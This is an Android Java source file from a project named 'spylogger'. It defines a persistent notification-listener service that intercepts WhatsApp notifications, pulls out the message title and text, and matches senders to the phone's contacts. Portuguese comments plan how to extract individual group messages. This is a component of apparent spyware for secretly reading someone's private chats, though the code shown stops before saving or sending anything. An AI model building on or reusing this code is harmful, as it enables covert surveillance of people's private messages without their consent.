package com.gravatasufoca.spylogger.receivers;

import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.ContatoVO;

import java.util.List;

public class NotificationMonitor extends NotificationListenerService {

    private final String WHATS="com.whatsapp";
    private Context context;
    private List<ContatoVO> contatos;

    @Override

    public void onCreate() {

        super.onCreate();
        context = getApplicationContext();
        contatos= Utils.getContatos(context.getContentResolver());

    }
    @Override

    public void onNotificationPosted(StatusBarNotification sbn) {
        String pack = sbn.getPackageName();
        if(WHATS.equals(pack)) {
            Bundle extras = sbn.getNotification().extras;
            ContatoVO contato=null;
            if(extras.get("android.people")!=null){
                contato=getContato(((String[]) extras.get("android.people"))[0]);
            }

            String title = extras.getString(Notification.EXTRA_TITLE);
            String text = extras.getCharSequence(Notification.EXTRA_TEXT).toString();
            text.toString();
            /*
            quando tem o contato, quer dizer que foi a primeira notificacao do grupo.
            quando nao tem o contato, quer dizer que faz parte do grupo e eh a primeira mensagem. Neste caso eu devo percorrer o grupo e pegar a mensagem com a tag!=null (tag eh o key do whats)
            nesta notificacao o android.textLine traz todas as mensagens.
            Descobrir como o textLine eh, verificar se sera possivel extrair mensagem por mensagem
             */
        }

    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i("Msg","Notification Removed");

    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private ContatoVO getContato(String uri){
        for(ContatoVO contatoVO:contatos){
            String[] tmp=uri.split("/");
            if(tmp.length>0){
                if(contatoVO.getId().equals(tmp[tmp.length-1])){
                    return contatoVO;
                }
            }
        }
        return null;
    }
}
